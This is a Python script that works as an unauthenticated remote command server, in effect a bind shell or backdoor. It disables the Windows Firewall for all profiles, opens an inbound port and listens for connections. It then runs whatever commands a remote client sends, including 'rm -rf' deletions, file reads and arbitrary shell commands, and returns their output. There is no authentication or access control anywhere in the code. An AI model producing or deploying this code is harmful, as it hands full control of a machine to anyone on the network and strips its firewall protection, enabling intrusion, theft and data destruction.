import socket
import os
import subprocess
import time

def get_ip_address():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    return ip_address

def find_open_port():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('', 0))
    addr, port = s.getsockname()
    s.close()
    return port

def disable_firewall():
    try:
        subprocess.run(["netsh", "advfirewall", "set", "allprofiles", "state", "off"], check=True)
        print("Windows Firewall disabled.")
    except subprocess.CalledProcessError as e:
        print(f"Failed to disable Windows Firewall: {e}")

def enable_firewall():
    try:
        subprocess.run(["netsh", "advfirewall", "set", "allprofiles", "state", "on"], check=True)
        print("Windows Firewall enabled.")
    except subprocess.CalledProcessError as e:
        print(f"Failed to enable Windows Firewall: {e}")

def open_port(port):
    try:
        subprocess.run([
            "netsh", "advfirewall", "firewall", "add", "rule",
            "name=Allow Port {}".format(port),
            "protocol=TCP",
            "dir=in",
            "action=allow",
            "enable=yes",
            "localport={}".format(port)
        ], check=True)
        print(f"Port {port} opened in Windows Firewall.")
    except subprocess.CalledProcessError as e:
        print(f"Failed to open port {port}: {e}")

def close_port(port):
    try:
        subprocess.run([
            "netsh", "advfirewall", "firewall", "delete", "rule",
            "name=Allow Port {}".format(port)
        ], check=True)
        print(f"Port {port} closed in Windows Firewall.")
    except subprocess.CalledProcessError as e:
        print(f"Failed to close port {port}: {e}")

def handle_client(client_socket):
    while True:
        command = client_socket.recv(1024).decode('utf-8')
        if command.lower() in ["exit", "quit"]:
            print("Closing connection...")
            client_socket.sendall(b"Connection closed.")
            break

        try:
            if command.startswith("cd "):
                os.chdir(command[3:])
                response = f"Changed directory to {os.getcwd()}"
            elif command.startswith("cp "):
                src, dest = command[3:].split(' ')
                subprocess.run(['cp', '-r', src, dest])
                response = f"Copied {src} to {dest}"
            elif command.startswith("mv "):
                src, dest = command[3:].split(' ')
                subprocess.run(['mv', src, dest])
                response = f"Moved {src} to {dest}"
            elif command.startswith("rm "):
                target = command[3:]
                subprocess.run(['rm', '-rf', target])
                response = f"Removed {target}"
            elif command.startswith("mkdir "):
                dir_name = command[6:]
                os.makedirs(dir_name, exist_ok=True)
                response = f"Created directory {dir_name}"
            elif command == "dir":
                response = subprocess.check_output('dir', shell=True).decode('utf-8')
            elif command == "pwd":
                response = os.getcwd()
            elif command.startswith("ren "):
                old_name, new_name = command[4:].split(' ')
                os.rename(old_name, new_name)
                response = f"Renamed {old_name} to {new_name}"
            elif command.startswith("type "):
                file_name = command[5:]
                with open(file_name, 'r') as file:
                    response = file.read()
            elif command.startswith("echo "):
                message = command[5:]
                response = message
            elif command.startswith("rmdir "):
                dir_name = command[6:]
                os.rmdir(dir_name)
                response = f"Removed directory {dir_name}"
            else:
                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output, error = process.communicate()
                response = output.decode('utf-8') + error.decode('utf-8')

            if not response:
                response = "Command executed."
        except Exception as e:
            response = str(e)

        client_socket.sendall(response.encode('utf-8'))

    client_socket.close()

def start_server(ip, port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((ip, port))
    server.listen(5)
    print(f"Server listening on {ip}:{port}")

    while True:
        client_socket, addr = server.accept()
        print(f"Accepted connection from {addr}")
        handle_client(client_socket)

if __name__ == "__main__":
    server_ip = get_ip_address()
    server_port = find_open_port()

    print(f"Server IP: {server_ip}")
    print(f"Server Port: {server_port}")

    disable_firewall()
    open_port(server_port)
    
    try:
        start_server(server_ip, server_port)
    finally:
        print("Stopping server...")
        close_port(server_port)
        enable_firewall()
        print("Server stopped and firewall settings restored.")
